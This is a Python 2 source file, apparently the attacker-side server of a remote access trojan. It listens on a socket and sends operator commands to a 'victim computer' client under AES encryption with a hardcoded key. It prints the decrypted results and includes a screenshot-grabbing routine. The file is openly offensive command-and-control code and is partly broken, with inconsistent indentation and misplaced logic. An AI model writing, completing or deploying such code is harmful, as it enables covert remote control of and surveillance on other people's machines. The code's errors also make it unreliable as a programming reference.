#!/usr/bin/env python
# THIS IS A ATTACKETR side code ../---> malicious code to be run on victim computer...

import os 
import readline
import socket

import sys
import string 
from Crypto import Random
from Crypto.Cipher import AES    # crypto.cipher method ->> python library for the symmetric encryption teqniques like aes/des/des3  with single symmetric key for encryption and decryption 


try:
    PORT = 829   # should be customisable../
except:

    print 'Usage: python file_name.py '
    print 'the port is to be same on both client/server side and is hardcoded till now , not generic for testing purpise'
    print 'the code is still in development and improvement phases'

    sys.exit(1)

HOST = 'localhost'
KEY  = '82e672ae054aa4de6f042c888111686a'  # hardcoded key in the code for now-->temp//
# generated the key as in victim_side code 

def pad(s):
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)


def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)   # initialisation vector for aes encryption 

    cipher = AES.new(KEY, AES.MODE_CBC, iv)  # using cipher block chaining or CBC  with vlock cipher method as a encryption method . 
    return iv + cipher.encrypt(plaintext)


def decrypt(ciphertext):
	
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')


def screen_shot():
	
	try : 
		hide_cmd = os.system("pip install pyscreenshot")
		import pyscreenshot as ImageGrab
		# fullscreen
		im=ImageGrab.grab()
		im.show()

	# part of the screen
		im=ImageGrab.grab(bbox=(10,10,500,500))
		im.show()

	# saving the to file
		ImageGrab.grab_to_file('im.png')
	except: 
		print("some error occured while execution")
	
def main():

	# initialising the network socket //

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(10)
    print 'Attacker Listening Server Started on the Port {}...'.format(PORT)

    conn, _ = s.accept()

    while True:
	# loop here to continue accept the command input suppplied by the attacker../

        cmd = raw_input('ExploitWithMe >> ').rstrip()
	
	if cmd == 'grab_screen':
	     screen_shot()
	      hide_cmd = os.system("cat im.png")
        # allow noop
        if cmd == '': # for nil input from user .../
            continue

        # send command to client
        conn.send(encrypt(cmd))
	
        # stop server
        if cmd == 'terminate':
            s.close()
            sys.exit(0)
       	# recieved the encrypted data sent by the client side code ..   
        data = conn.recv(4096)
	# now decrypting here the  data recived to the plaintext from AES cipher text ... 
        print decrypt(data)
	#printing the decrypted  data

if __name__ == '__main__':
	main()
